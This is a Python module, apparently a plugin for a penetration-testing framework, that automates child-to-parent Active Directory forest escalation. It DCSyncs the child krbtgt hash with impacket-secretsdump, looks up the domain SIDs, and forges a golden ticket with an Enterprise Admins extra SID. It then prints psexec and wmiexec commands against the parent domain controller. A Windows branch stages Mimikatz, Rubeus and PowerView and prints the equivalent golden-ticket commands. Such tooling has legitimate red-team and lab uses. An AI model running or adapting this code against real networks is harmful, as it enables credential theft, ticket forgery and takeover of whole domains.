PROVIDES = []
REQUIRES = ["creds"]


def run(data, cred, args):

    import subprocess
    import re
    import shutil
    import argparse

    from core.paths import get_artifacts_dir
    from core.target import target_add_cred

    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    R = '\033[91m'
    W = '\033[0m'


    
    child_dc = data["ip"]
    child_domain = data["domain"]
    child_netbios = child_domain.split(".")[0].upper()
    artifacts = get_artifacts_dir(data["name"])

    if getattr(args, "windows", False):

        from modules.upload.windows import stage_windows_files
        from core.paths import get_tools_dir

        print(
            f"{B}[?]{W} Transfer PowerView / Mimikatz / Rubeus?\n"
        )

        print(
            f"  {B}[1]{W} Yes"
        )

        print(
            f"  {B}[2]{W} No\n"
        )

        choice = input(
            f"{Y}Select> {W}"
        ).strip()

        if choice == "1":

            windows_tools = (
                get_tools_dir() /
                "windows"
            )

            stage_windows_files([
                windows_tools / "PowerView.ps1",
                windows_tools / "mimikatz.exe",
                windows_tools / "Rubeus.exe",
            ])

        print()

        print(
            f"{G}[+] PowerView{W}\n"
        )

        print(
            f"{Y}. .\\PowerView.ps1{W}"
        )

        print()

        input(
            f"{Y}[?]{W} Press ENTER once PowerView has been imported..."
        )

        print()

        print(
            f"{Y}Get-DomainSID{W}"
        )

        print()

        child_sid = input(
            f"{Y}Child Domain SID> {W}"
        ).strip()

        print()

        print(
            f"{Y}Get-DomainGroup "
            f"-Domain {child_domain} "
            f"-Identity \"Enterprise Admins\" "
            f"| select distinguishedname,objectsid{W}"
        )

        print()

        enterprise_sid = input(
            f"{Y}Enterprise Admins SID> {W}"
        ).strip()

        print()

        print(
            f"{G}[+] Mimikatz{W}\n"
        )

        print(
            f"{Y}mimikatz.exe{W}"
        )

        print()

        print(
            f"{Y}lsadump::dcsync "
            f"/user:{child_netbios}\\krbtgt{W}"
        )

        print()

        krbtgt = input(
            f"{Y}KRBTGT Hash> {W}"
        ).strip()

        print()

        print(
            f"{G}[+] Golden Ticket (Mimikatz){W}\n"
        )

        print(
            f"{Y}kerberos::golden "
            f"/user:administrator "
            f"/domain:{child_domain} "
            f"/sid:{child_sid} "
            f"/krbtgt:{krbtgt} "
            f"/sids:{enterprise_sid} "
            f"/ptt{W}"
        )

        print()

        print(
            f"{Y}klist{W}"
        )

        print()

        print(
            f"{Y}dir \\\\{C}<parent-dc-fqdn>{Y}\\c${W}"
        )

        print()

        print(
            f"{Y}lsadump::dcsync "
            f"/user:{C}<PARENT-NETBIOS>{Y}\\Administrator "
            f"/domain:{C}<parent-domain>{W}"
        )

        print()

        print(
            f"{G}[+] Golden Ticket (Rubeus){W}\n"
        )

        print(
            f"{Y}Rubeus.exe golden "
            f"/rc4:{krbtgt} "
            f"/domain:{child_domain} "
            f"/sid:{child_sid} "
            f"/sids:{enterprise_sid} "
            f"/user:administrator "
            f"/ptt{W}"
        )

        print()

        print(
            f"{Y}klist{W}"
        )

        print()

        print(
            f"{Y}dir \\\\{C}<parent-dc-fqdn>{Y}\\c${W}"
        )

        print()

        return

        

    print(
        f"\n{B}┌── RAISE CHILD ──────────────────────┐{W}"
    )

    print(
        f"  {B}[1]{W} Manual"
    )

    print(
        f"  {B}[2]{W} raiseChild.py\n"
    )

    choice = input(
        f"{Y}Select> {W}"
    ).strip()

    #
    # ----------------------------------------------------------
    # AUTOMATIC
    # ----------------------------------------------------------
    #

    if choice == "2":

        parent_dc = input(
            f"{Y}Parent DC> {W}"
        ).strip()

        if not parent_dc:
            return

        cmd = [
            "impacket-raiseChild",
            "-target-exec",
            parent_dc,
            f"{child_domain}/{cred['user']}:{cred['secret']}"
        ]

        print()

        print(
            f"{B}[*]{W} Launching raiseChild..."
        )

        print(
            f"{Y}{' '.join(cmd)}{W}\n"
        )

        subprocess.run(cmd)

        print()

        return

    #
    # ----------------------------------------------------------
    # MANUAL
    # ----------------------------------------------------------
    #

    parent_dc = input(
        f"{Y}Parent DC> {W}"
    ).strip()

    if not parent_dc:
        return

    ticket_user = input(
        f"{Y}Ticket User [{C}administrator{Y}]> {W}"
    ).strip()

    if not ticket_user:
        ticket_user = "administrator"

    #
    # KRBTGT
    #

    print()

    print(
        f"{B}[*]{W} DCSync child KRBTGT..."
    )

    secretsdump = [
        "impacket-secretsdump",
        f"{child_domain}/{cred['user']}:{cred['secret']}@{child_dc}",
        "-just-dc-user",
        f"{child_netbios}\\krbtgt",
    ]

    print(
        f"{Y}{' '.join(secretsdump)}{W}\n"
    )

    result = subprocess.run(
        secretsdump,
        capture_output=True,
        text=True,
    )

    for line in result.stdout.splitlines():
        if "Domain SID is:" in line:
            print(line)

    krbtgt = None

    m = re.search(
        r"krbtgt:502:[^:]*:([0-9a-fA-F]{32})",
        result.stdout,
    )

    if m:
        krbtgt = m.group(1)
    print()
    print(f"[*] KRBTGT hash is: {krbtgt}")

    if not krbtgt:

        print(
            f"{R}[!] Failed to recover KRBTGT hash.{W}"
        )

        return

    
    #
    # CHILD SID
    #

    print()

    print(
        f"{B}[*]{W} Enumerating child SID..."
    )

    lookup = [
        "impacket-lookupsid",
        f"{child_domain}/{cred['user']}:{cred['secret']}@{child_dc}",
    ]

    print(
        f"{Y}{' '.join(lookup)}{W}\n"
    )

    result = subprocess.run(
        lookup,
        capture_output=True,
        text=True,
    )

    for line in result.stdout.splitlines():

        if "Domain SID is:" in line:
            print(line)

        elif "Enterprise Admins" in line:
            print(line)

    child_sid = None

    m = re.search(
        r"Domain SID is:\s*(S-[0-9\-]+)",
        result.stdout,
    )

    if m:
        child_sid = m.group(1)

    if not child_sid:

        print(
            f"{R}[!] Failed to recover child SID.{W}"
        )

        return

    #
    # PARENT SID
    #

    print()

    print(
        f"{B}[*]{W} Enumerating parent Enterprise Admin SID..."
    )

    lookup = [
        "impacket-lookupsid",
        f"{child_domain}/{cred['user']}:{cred['secret']}@{parent_dc}",
    ]

    print(
        f"{Y}{' '.join(lookup)}{W}\n"
    )

    result = subprocess.run(
        lookup,
        capture_output=True,
        text=True,
    )

    m = re.search(
        r"Domain SID is:\s*(S-[0-9\-]+)",
        result.stdout,
    )

    if not m:

        print(
            f"{R}[!] Failed to recover parent SID.{W}"
        )

        return

    parent_sid = m.group(1) + "-519"

    #
    # SUMMARY
    #

    print()

    print(
        f"{G}┌── VALUES ───────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} KRBTGT Hash : {krbtgt}"
    )

    print(
        f"{G}│{W} Child SID   : {child_sid}"
    )

    print(
        f"{G}│{W} Parent SID  : {parent_sid}"
    )

    print(
        f"{G}└─────────────────────────────────────┘{W}"
    )

    print()

    ccache = artifacts / f"{ticket_user}.ccache"

    ticketer = [
        "impacket-ticketer",
        "-nthash",
        krbtgt,
        "-domain",
        child_domain,
        "-domain-sid",
        child_sid,
        "-extra-sid",
        parent_sid,
        ticket_user,
    ]

    print(
        f"{B}[*]{W} Forging Golden Ticket..."
    )

    print()

    print(
        f"{Y}{' '.join(ticketer)}{W}\n"
    )

    subprocess.run(
        ticketer
    )

    generated = f"{ticket_user}.ccache"

    try:

        shutil.move(
            generated,
            ccache,
        )

    except Exception:
        pass

    target_add_cred(
        argparse.Namespace(
            user=ticket_user,
            password=None,
            hash=None,
            aes=None,
            ccache=str(ccache),
        )
    )

    print()

    print(
        f"{G}[+] Ticket saved:{W} {ccache}"
    )

    print(
        f"{G}[+] Imported into credential store.{W}"
    )

    print()

    print(
        f"{B}[*]{W} Use Ticket"
    )

    print()

    print(
        f"{Y}export KRB5CCNAME={ccache}{W}"
    )

    print()

    print(
        f"{Y}impacket-psexec -k -no-pass {child_domain}/{ticket_user}@{C}<parent-dc-fqdn>{W}"
    )

    print(
        f"{Y}impacket-wmiexec -k -no-pass {child_domain}/{ticket_user}@{C}<parent-dc-fqdn>{W}"
    )

    print()
